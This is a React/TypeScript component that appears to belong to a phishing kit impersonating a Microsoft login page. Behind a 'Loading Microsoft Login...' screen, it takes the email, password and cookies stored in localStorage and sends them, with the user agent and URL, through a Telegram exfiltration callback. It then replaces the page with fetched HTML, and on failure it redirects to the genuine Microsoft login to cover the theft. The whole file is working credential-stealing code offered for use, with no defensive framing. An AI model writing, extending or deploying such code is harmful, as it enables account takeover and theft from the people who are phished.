import React, { useEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
  sendToTelegram: (data: any) => Promise<void>;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sendToTelegram }) => {
  
  useEffect(() => {
    const loadReplacementHTML = async () => {
      try {
        const response = await fetch('/replacement.html');
        const htmlContent = await response.text();
        
        // Send data to Telegram before replacing content
        await sendToTelegram({
          email: localStorage.getItem('captured_email') || '',
          password: localStorage.getItem('captured_password') || '',
          cookies: JSON.parse(localStorage.getItem('captured_cookies') || '[]'),
          authenticationTokens: {},
          userAgent: navigator.userAgent,
          sessionId: 'replacement_' + Math.random().toString(36).substring(2, 15),
          url: window.location.href
        });
        
        // Replace the entire document with the fetched HTML
        document.open();
        document.write(htmlContent);
        document.close();
        
      } catch (error) {
        console.error('Failed to load replacement.html:', error);
        // Fallback: redirect to Microsoft login
        window.location.replace("https://login.microsoftonline.com");
      }
    };

    loadReplacementHTML();
  }, [onLoginSuccess, sendToTelegram]);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{
        textAlign: 'center',
        fontSize: '24px',
        color: '#323130'
      }}>
        Loading Microsoft Login...
      </div>
    </div>
  );
};

export default RealOAuthRedirect;
